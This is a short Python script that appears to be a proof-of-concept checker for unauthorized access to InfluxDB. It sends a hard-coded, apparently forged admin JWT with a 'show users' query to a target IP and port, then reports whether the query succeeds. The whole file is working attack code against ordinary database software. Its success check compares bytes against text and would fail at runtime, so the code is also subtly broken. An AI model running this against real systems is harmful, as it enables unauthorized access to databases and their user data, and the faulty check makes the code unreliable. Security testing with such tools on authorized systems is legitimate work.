try:
    import os,logging,requests
    logging.basicConfig(level=logging.INFO,format="%(message)s")
except Exception as e:
    os._exit(6)
def check(ip,port):
    try:
        heard = {
                    "Accept-Language": "en",
                    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoyNjc2MzQ2MjY3fQ._bFrqd3k7hTBZDX5FB4Jo6rY6yIL1HxN2cr9r91m6TQ",
                    "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
                    "Connection": "close",
                    "Content-Type": "application/x-www-form-urlencoded"
                }
        data = "db=sample&q=show+users"
        target = "http://" + ip + ":" +port +"/query"
        req = requests.post(target,headers= heard,data=data,timeout=3)
        if b"results" in req.text:
            logging.info("[+] {} find influxdb unauthorized".format(ip)) 
            os._exit(1)
        else:
            logging.info("[-] {} do not found influxdb unauthorized".format(ip)) 
            os._exit(2)
    except Exception as e:
        logging.info("[*] {}".format(e))
        os._exit(4)
if __name__ == "__main__":
    import sys
    ip = sys.argv[1]
    port = sys.argv[2]
    check(ip,port)